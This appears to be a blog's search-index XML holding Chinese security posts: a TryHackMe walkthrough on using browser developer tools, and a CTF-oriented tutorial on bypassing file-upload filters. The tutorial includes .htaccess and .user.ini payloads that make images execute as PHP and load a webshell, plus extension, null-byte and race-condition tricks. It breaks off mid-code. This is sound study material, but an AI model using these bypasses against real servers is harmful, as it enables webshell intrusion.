<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Csvpir</title>
    <url>/2025/12/07/hello-world/</url>
    <content><![CDATA[<p>Welcome to my blog!</p>
<hr>
<hr>
<p>title: Hello World # 标题<br>date: 2019&#x2F;3&#x2F;26 hh:mm:ss # 时间<br>categories: # 分类<br>	- 分类  # 只能有一个<br>tags: # 标签<br>	- PS3  # 能有多个<br>- Games  # 一个标签一行</p>
<hr>
<p>摘要</p>
<span id="more"></span>
<p>正文</p>
]]></content>
  </entry>
  <entry>
    <title>【THM】Walking An Application(遍历Web应用程序)</title>
    <url>/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/</url>
    <content><![CDATA[<h1 id="Walking-An-Application-遍历Web应用程序"><a href="#Walking-An-Application-遍历Web应用程序" class="headerlink" title="Walking An Application(遍历Web应用程序)"></a>Walking An Application(遍历Web应用程序)</h1><p>TryHackMe靶场地址：<a href="https://tryhackme.com/room/walkinganapplication">https://tryhackme.com/room/walkinganapplication</a></p>
<p>学习目标：学习如何仅使用浏览器内置工具<strong>手动</strong>审查网页应用的安全问题。自动化安全工具和脚本往往会遗漏许多潜在漏洞和有用信息。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本房间中使用的内置浏览器工具的简要介绍：</p>
<ul>
<li><strong>查看源代码</strong>(<strong>View Source</strong>)——使用浏览器查看网站的人类可读源代码。</li>
<li><strong>检查员</strong>(<strong>Inspector</strong>)——学习如何检查页面元素并进行修改以查看通常被屏蔽的内容。</li>
<li><strong>调试器</strong>(<strong>Debugger</strong>) ——检查并控制页面 JavaScript 的流程</li>
<li><strong>网络</strong>(<strong>Network</strong>)——查看页面发出的所有网络请求。</li>
</ul>
<h2 id="探索网站"><a href="#探索网站" class="headerlink" title="探索网站"></a>探索网站</h2><p>作为渗透测试员，您在审查网站或网页应用时的角色是发现可能存在漏洞的功能，并尝试利用这些漏洞来评估这些功能是否存在。这些功能通常是网站中需要与用户互动的部分。</p>
<p>查找网站的交互部分就像发现登录表单然后手动查看网站的 JavaScript 一样简单。 一个很好的起点是使用你的浏览器访问目标网站，了解该网站的各个页面&#x2F;区域&#x2F;功能，并为每个页面&#x2F;区域&#x2F;功能做简单的信息记录</p>
<p>Acme IT Support 示例站点的审查如下所示：</p>
<p><img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/%E6%88%AA%E5%B1%8F2025-12-13%2021.33.06.png" alt=" "></p>
<h2 id="查看网页源代码"><a href="#查看网页源代码" class="headerlink" title="查看网页源代码"></a>查看网页源代码</h2><p>页面源代码是每次我们请求时，从网页服务器返回给浏览器&#x2F;客户端的可读代码。返回的代码由 HTML（超文本标记语言）、CSS（层叠样式表）和 JavaScript 组成，它告诉浏览器要显示哪些内容、如何显示，并增加了与 JavaScript 的交互性元素。就我们而言，查看页面源代码有助于我们发现更多关于该网页应用的信息。</p>
<p><strong>查看源代码三种方式</strong></p>
<ul>
<li>浏览网站时右击页面，菜单会显示“查看源代码”选项</li>
<li>大多数浏览器支持在 URL 前面放置 view-source：例如 :<code>view-source:https://www.google.com/</code>会直接显示网页源代码</li>
<li>在浏览器菜单中，你会看到查看页面源代码的选项。这个选项有时会出现在子菜单中，比如开发者工具或更多工具。</li>
</ul>
<p><strong>分析常见网页源代码</strong></p>
<p>页面顶部你会注意到一些代码以 <code>&lt;--</code> 到 <code>--&gt;</code> 结尾 ， 这些是html语言注释。这是开发者自己的代码解释或是留言。</p>
<p>HTML 中指向不同页面的链接会写在锚标签中（这些是以 <code>&lt;a</code> 开头的 HTML 元素 ），而你被引导到的链接会存储在 <code>href</code> 属性中。</p>
<p>例如，你会在第31行看到联系页面链接：<img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/ccc306acf34d0c83ffd18f33da1a5994.png" alt="img"></p>
<p>如果你查看页面源码的更下方，有一个隐藏链接指向一个以“secr”开头的页面，点击这个链接可以获得另一个标记。在现实中你显然不会被标记，但你可能会发现公司用来存储公司&#x2F;员工&#x2F;客户信息的私人区域。</p>
<p>外部文件如 CSS、JavaScript 和图片可以通过 HTML 代码包含。在这个例子中，你会注意到这些文件都存储在同一个目录中。如果你在网页浏览器中查看该目录，会有配置错误。应该显示的是空白页面或 403 禁止页面，错误提示您无法访问该目录。取而代之的是启用目录列表功能，实际上它列出了目录中的每个文件。有时这不是问题，目录中的所有文件都可以安全公开查看，<strong>但在某些情况下备份文件、源代码或其他机密信息可能被存储在这里</strong>。</p>
<img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/%E6%88%AA%E5%B1%8F2025-12-13%2021.00.31.png" alt=" " style="zoom:50%;">

<p>现在很多网站都不是从零开始做的，而是用所谓的框架。框架是一组预制代码，方便开发者包含网站所需的常见功能，如博客、用户管理、表单处理等，节省开发时间。查看页面源代码通常能让我们判断某个框架是否在使用，如果使用了，是哪个框架，甚至是哪个版本。了解框架和版本是个很有价值的发现，因为框架可能存在公开漏洞，网站可能不是最新版本。</p>
<p>练习答案：</p>
<p><img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/image-20251213220228260.png" alt="image-20251213220228260"></p>
<h2 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h2><p>每个现代浏览器都包含开发者工具，这是一个帮助网页开发者调试网页应用的工具包，能让你一窥网站内部，了解实际情况。作为一名渗透测试员，我们可以利用这些工具更好地理解网页应用。我们特别关注开发者工具包的三个功能：检查器、调试器和网络。</p>
<h3 id="Inspector（检查器）"><a href="#Inspector（检查器）" class="headerlink" title="Inspector（检查器）"></a><strong>Inspector（检查器）</strong></h3><p>页面源代码并不总是代表网页上将显示的内容，这是因为 CSS、JavaScript 和用户交互可以改变网页页面的内容和样式，这意味着我们需要一种方法来查看此时浏览器窗口中显示的内容，而 Element 检查器可以通过为我们提供当前网站网页上的实时显示内容来协助我们。</p>
<p>除了查看实时视图，我们还可以编辑页面元素并与之交互，这有助于 Web 开发人员调试问题。在 Acme IT Support 网站上（目标示例站点），单击新闻部分，你将在其中看到三篇新闻文章。</p>
<p>前两篇文章是可读的，但第三篇被阻止阅读，其内容上方有一条浮动通知，提示你必须是高级客户才能查看该文章。 这些阻止页面内容的浮动框通常被称为付费墙，因为该网站在你希望看到的内容前面设置了一堵隐喻性的墙，直到你付费为止。如图<br><img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/image-20251213221125622.png" alt="image-20251213221125622" style="zoom: 33%;"></p>
<p>右键单击高级通知 ( 高级通知即paywall )，你应该能够从菜单中选择 Inspect 选项，这将根据你使用浏览器种类或偏好在底部或右侧打开开发者工具，然后你将看到构成网站的elements(元素)&#x2F;HTML（类似于下面的屏幕截图）。<br><img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/0e3f5c5c8dd02916d6fc2637461293a9.png" alt="img" style="zoom: 67%;"></p>
<p>找到具有<code>premium-customer-blocker</code>类 的 <code>DIV</code> 元素并单击它。你将在样式框中看到适用于该元素的所有 CSS 样式，例如<code>margin-top: 60px</code>和<code>text-align: center</code>。 我们感兴趣的样式是<code>display: block</code>。 如果我们单击单词block，则可以键入自己选择的值，尝试输入 none，这将使得之前的浮动框消失，并显示其下方的内容和一个flag 。 </p>
<img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/image-20251213221753527.png" alt="image-20251213221753527" style="zoom: 33%;">

<p>试一试元素检查器，你会发现你可以更改网站上的任何信息，包括内容。请记住，这仅在你的浏览器窗口中进行编辑，当你按下刷新时，你在浏览器中正在查看的网页的一切内容都会恢复正常。</p>
<h3 id="Debugger（调试器）"><a href="#Debugger（调试器）" class="headerlink" title="Debugger（调试器）"></a>Debugger（调试器）</h3><p>开发者工具中的这个面板用于调试 JavaScript，对于想要弄清楚为什么某些东西可能无法正常工作的人来说，同样是一个极好的功能。但作为渗透测试人员，它让我们可以深入挖掘 JavaScript 代码。在 Firefox 和 Safari 中，这个功能叫做调试器，但在 Google Chrome 里叫“Sources”。</p>
<p>在 Acme IT Support 网站（目标站点）上，单击 contact 页面，每次加载页面时，你可能会注意到屏幕上会有快速闪烁的红色。 我们将使用调试器来确定这个红色闪光是什么以及它是否包含任何有趣的内容。调试这个红点并不会是你在现实世界中作为渗透测试人员会做的事情，该示例只是允许我们了解Debugger功能。</p>
<p>在浏览器的左侧，你会看到当前网页正在使用的所有资源的列表。单击资产（assets ）文件夹，你将看到一个名为 flash.min.js 的文件，继续单击此文件将显示此 JavaScript 文件的内容。</p>
<p>在浏览器中查看 javascript 文件时，你可能会注意到所有内容都在一行上，因为它已被最小化，这意味着所有格式（制表符、间距和换行符）都已被删除以使文件更小。 这个js文件也不例外，而且它被混淆了，这使得它很难被阅读，以保证它不能被其他开发者轻易复制。</p>
<p>我们可以通过使用“Pretty Print”选项对js的内容应用格式，这个功能选项的标志像两个大括号 { } ，它能使js文件更具可读性。滚动到 flash.min.js 文件的底部，你将看到以下行：flash<a href>‘remove’</a>;<br><img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/d76d0b263799865be55d6725cbeaf21b.png" alt="img"></p>
<p>这点 JavaScript 就是移除页面红色弹窗的原因。我们还可以使用调试器的另一个功能，称为 <strong>断点</strong> 。这些是代码中我们可以强制浏览器停止处理 JavaScript 并暂停当前执行的点。</p>
<p>如果你点击包含上述代码的行号，你会注意到它会变成蓝色;你现在已经在这条线上插入了一个断点。现在试着刷新页面，你会发现红色框会留在页面上而不是消失，并且里面有一个flag。</p>
<img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/image-20251213223156455.png" alt="image-20251213223156455" style="zoom:50%;">

<h3 id="Network（网络）"><a href="#Network（网络）" class="headerlink" title="Network（网络）"></a>Network（网络）</h3><p>开发者工具上的网络选项卡可用于跟踪网页发出的每个外部请求。 如果你在开发者工具栏中单击“网络”选项卡，然后刷新页面，你将看到有关该页面请求的所有文件。</p>
<p>尝试在目标站点的 contact 页面上执行此操作，如果列表的内容有点繁杂，你可以按垃圾桶图标清除列表。</p>
<p>在网络选项卡打开的情况下，尝试在网页上填写联系表格并按下发送消息按钮，你会注意到网络选项卡中会出现一个相关的事件，该事件会包含一个在后台使用称为 AJAX 的方法提交的表单。 AJAX 是一种在 Web 应用程序后台发送和接收网络数据的方法，通过更改当前网页无法进行干扰。</p>
<img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/9ec0890f159397547950ea1822994443.png" alt="img" style="zoom: 67%;">

<p>查看在网络选项卡中出现的和contact 表单相关的新条目，查看响应消息以获取flag</p>
<p><img src="/2025/12/13/%E3%80%90THM%E3%80%91Walking%20An%20Application(%E9%81%8D%E5%8E%86Web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F)/image-20251213223904602.png" alt=" "></p>
]]></content>
      <categories>
        <category>TryHackMe</category>
      </categories>
  </entry>
  <entry>
    <title>文件上传漏洞</title>
    <url>/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>文件上传漏洞是指用户上传了一个<strong>可执行的脚本文件</strong>，并通过此脚本文件获得了执行服务器端命令的能力。“文件上传” 本身没有问题，有问题的是文件上传后，服务器怎么处理、解释文件。如果服务器的处理逻辑做的不够安全，则会导致严重的后果。</p>
<p>漏洞满足条件：</p>
<ul>
<li>说明一：能成功上传文件并符合对方服务器运行的<strong>语言环境</strong>，比如人家后端php处理的你不能上传一个java的后门代码。</li>
<li>说明二：你上传文件的目录可以被脚本语言<strong>解析执行</strong>，如果你上传的目录没有<strong>执行权限</strong>也不行。</li>
<li>说明三：一般文件上传后会返回你一个地址，如果不知道<strong>上传到的路径</strong>也很难构成文件上传漏洞。</li>
</ul>
<p>简单来说就是上传代码能解析，知道上传到的目录地址，目录下有执行权限。</p>
<hr>
<h2 id="Ctf中的文件上传"><a href="#Ctf中的文件上传" class="headerlink" title="Ctf中的文件上传"></a>Ctf中的文件上传</h2><h3 id="前端js过滤"><a href="#前端js过滤" class="headerlink" title="前端js过滤"></a>前端js过滤</h3><p>只进行前端校验，这个太简单就不详细演示了。</p>
<p>常见绕过方法就两种：</p>
<ul>
<li>1.直接禁用浏览器js绕过</li>
<li>2.看前端源码校验条件，bp改包绕过。</li>
</ul>
<hr>
<h3 id="中间件配置文件解析绕过"><a href="#中间件配置文件解析绕过" class="headerlink" title="中间件配置文件解析绕过"></a>中间件配置文件解析绕过</h3><p>常见题目主要针对apache和nginx中间件+php的组合。</p>
<p>.htaccess和.user.ini分别为apache和nginx服务器的配置文件，如果我们更改配置文件信息将我们要上传的恶意文件解析为正常文件，并将这个配置文件上传覆盖原来的再上传恶意文件，就绕过了中间件。</p>
<ul>
<li>.htaccess文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br><span class="line">---</span><br><span class="line">//建议直接用第二个有针对性</span><br><span class="line">&lt;FilesMatch &quot;muma.jpg&quot;&gt;</span><br><span class="line">SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>

<p>此文件的内容大概意思为，.htaccess文件可以将.jpg文件当作php文件解析执行。</p>
<ul>
<li>.user.ini文件</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file=muma.php //muma.php为木马文件名字</span><br></pre></td></tr></table></figure>

<p>针对配置文件两种方式：</p>
<p>​	1.<code>auto_prepend_file</code>函数在PHP文件执行前自动包含指定文件。比如我们把muma.php上传到的目录里有一个名为index.php的文件，访问该文件我们的恶意文件也会被执行。</p>
<p>​	2.利用文件头伪造在<code>.user.ini</code>文件中添加伪造的文件头（如GIF文件头）以绕过文件头验证，得以绕过中间件。</p>
<hr>
<h3 id="content-type（服务端检测–MIME-类型）"><a href="#content-type（服务端检测–MIME-类型）" class="headerlink" title="content-type（服务端检测–MIME 类型）"></a>content-type（服务端检测–MIME 类型）</h3><p><code>Content-Type</code> 是 HTTP 协议中的一个请求&#x2F;响应头字段，用于<strong>指示资源的 MIME 类型</strong>。它的核心作用是告诉接收方（浏览器、服务器等）：「我给你发送的数据是什么格式，请用对应的方式处理」。</p>
<p>常用如下：</p>
<table>
<thead>
<tr>
<th align="left">type&#x2F;subtype</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td align="left">image&#x2F;jpeg</td>
<td>jpg图片格式</td>
</tr>
<tr>
<td align="left">image&#x2F;png</td>
<td>png图片格式</td>
</tr>
<tr>
<td align="left">image&#x2F;gif</td>
<td>gif格式</td>
</tr>
</tbody></table>
<p>如：</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2.jpeg" alt=" "></p>
<p>bp抓包改MIME类型为image&#x2F;png即可绕过</p>
<h3 id="绕过文件头检测"><a href="#绕过文件头检测" class="headerlink" title="绕过文件头检测"></a>绕过文件头检测</h3><p>1.添加GIF89a进行绕过</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%B1%8F2025-12-09%2000.09.07.png" alt=" "></p>
<p>2.也可以创建一个txt文档写入木马改为png后缀，然后010打开加上真正的png文件头，最后bp抓包改png为php实现文件头检测绕过。</p>
<hr>
<h3 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h3><p>1.等价扩展名绕过</p>
<table>
<thead>
<tr>
<th>语言</th>
<th>等价扩展名</th>
</tr>
</thead>
<tbody><tr>
<td>asp</td>
<td>asa、cer、cdx</td>
</tr>
<tr>
<td>aspx</td>
<td>ashx、asmx、ascx</td>
</tr>
<tr>
<td>php</td>
<td>php2、php3、php4、phps、phtml</td>
</tr>
<tr>
<td>jsp</td>
<td>jspx、jspf</td>
</tr>
</tbody></table>
<p>2.在windows系统中</p>
<ul>
<li>文件名大小写绕过，如.pHp  .aSP。</li>
<li>空格、点号绕过，bp抓包在上传的文件后面加。</li>
<li>::$DATA绕过限制，Windows系统在保存info.php::$DATA一类的文件时会自动去除文件后的::$DATA字符串，保存的文件名为info.php。</li>
</ul>
<p>3.文件名双写绕过，如：.pphphp等</p>
<p>4.Unicode： 当目标存在json_decode且检查在json_decode之前,可以将php写为\u0070hp</p>
<p>5.特殊文件名绕过，比如windows文件名最后不能有.或空格，可设为*.php.或*.php+。</p>
<hr>
<h3 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="00截断绕过"></a>00截断绕过</h3><p>这个漏洞是操作系统层面的，由于操作系统一般是由c语言写的。在C语言及受其影响的系统中，空字符（<code>\x00</code>，ASCII值为0）被用作字符串的<strong>结束标志</strong>。其在定义字符串时都是以\0（0x00）作为字符串结尾。所以操作系统在识别字符串时，读到\0就以为读到一个字符串的结尾符号，以此达到绕过的目的。</p>
<p><strong>漏洞条件</strong>：</p>
<ul>
<li>php版本&lt;5.3.4</li>
<li>magic_quotes_gpc &#x3D; Off 关闭状态</li>
</ul>
<p><code>magic_quotes_gpc</code>函数：开启之后php会对字符串进行转义，为了防止sql注入、xss、文件包含等攻击，在php5.4.0已经被弃用了。</p>
<p><strong>利用场景</strong>：</p>
<p>黑&#x2F;白名单绕过</p>
<p>如图后端设置了白名单，只允许jpg、png、gif文件上传</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%B1%8F2025-12-09%2011.04.22.png" alt=" "></p>
<p>所以构造<code>muma.php.png</code>文件内写入木马</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%B1%8F2025-12-09%2011.13.25.png" alt=" "></p>
<p>上传后bp抓包改get头和文件名两个地方</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%B1%8F2025-12-09%2011.19.52.png" alt=" "></p>
<p>最后访问我们的上传路径发现空白，说明上传成功</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E6%88%AA%E5%B1%8F2025-12-09%2011.46.49.png" alt=" "></p>
<p>最后webshell工具连一下就行。黑名单同理。</p>
<hr>
<h3 id="条件竞争"><a href="#条件竞争" class="headerlink" title="条件竞争"></a>条件竞争</h3><p>核心是<strong>并发操作的时序失控</strong>。正常后端对上传的文件处理逻辑是上传→验证→移动 &#x2F; 删除，但是如果这个过程未加锁，攻击者可在 “验证通过前” 访问文件。</p>
<p>以攻防世界<code>wzsc_文件上传</code>题为例</p>
<p>构造一个名为muma.php的文件写入以下内容多线程上传到服务器，然后我们一直访问muma.php文件，出现空白页面说明解析，我们成功将shell.php木马上传到了服务器。</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%201.png" alt=" "></p>
<p>上传muma.php后bp抓两个包放到攻击模块里，第一个包改payload类型无限循环发空包。</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%202.png" alt=" "></p>
<p>并设置线程数为30</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%203.png" alt=" "></p>
<p>另一个包也无限发包，将线程数大于前面空包，这里设置为80</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%204.png" alt=" "></p>
<p>开始攻击后，不断刷新访问muma.php文件，显示空白则php被解析。</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%205.png" alt=" "></p>
<p>到上传目录中可以看到我们的后门shell.php成功写入了。</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%206.png" alt=" "></p>
<p>由于是后门木马所以最后webshell工具连接找flag就行</p>
<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%9B%BE%E7%89%87%207.png" alt=" "></p>
<hr>
<h3 id="二次渲染"><a href="#二次渲染" class="headerlink" title="二次渲染"></a>二次渲染</h3><p>二次渲染的原理是通过服务器端的相关函数对用户上传的图片进行重新二次渲染，破坏掉原始图片文件中可能隐藏的恶意代码，从而有效防范了图片马等常见文件上传攻击手段。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">二次渲染逻辑：</span><br><span class="line">原始上传文件 → 解析器读取 → 内存数据结构 → 生成器编码 → 新文件</span><br><span class="line">   ↓              ↓           ↓           ↓        ↓</span><br><span class="line">  字节流      提取核心数据  像素矩阵/文档树  重新编码   纯净文件</span><br><span class="line">(可能含恶意代码)          (去除非核心数据)  (标准化格式)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>特征：</p>
<ul>
<li>图片上传后大小发生变化</li>
<li>bp抓包图片数据包发生变化</li>
</ul>
<p>这里以upload-labs的17关为例，源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="comment">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$filetype</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>];</span><br><span class="line">    <span class="variable">$tmpname</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$target_path</span>=UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获得上传文件的扩展名</span></span><br><span class="line">    <span class="variable">$fileext</span>= <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">strrchr</span>(<span class="variable">$filename</span>,<span class="string">&quot;.&quot;</span>),<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class="line">    <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;jpg&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagejpeg</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;png&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/png&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefrompng</span>(<span class="variable">$target_path</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是png格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                 <span class="comment">//给新图片指定文件名</span></span><br><span class="line">                <span class="title function_ invoke__">srand</span>(<span class="title function_ invoke__">time</span>());</span><br><span class="line">                <span class="variable">$newfilename</span> = <span class="title function_ invoke__">strval</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.png&quot;</span>;</span><br><span class="line">                <span class="comment">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class="line">                <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfilename</span>;</span><br><span class="line">                <span class="title function_ invoke__">imagepng</span>(<span class="variable">$im</span>,<span class="variable">$img_path</span>);</span><br><span class="line"></span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$target_path</span>);</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;               </span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;上传出错！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>((<span class="variable">$fileext</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$filetype</span>==<span class="string">&quot;image/gif&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmpname</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="comment">//使用上传的图片生成新的图片</span></span><br><span class="line">            <span class="variable">$im</span> = <span class="title function_ invoke__">imagecreatefromgif</span>(<span class="variable">$target_path</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$im</span> == <span class="literal">false</span>)&#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;该文件不是gif格式的图片！&quot;</span>;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span 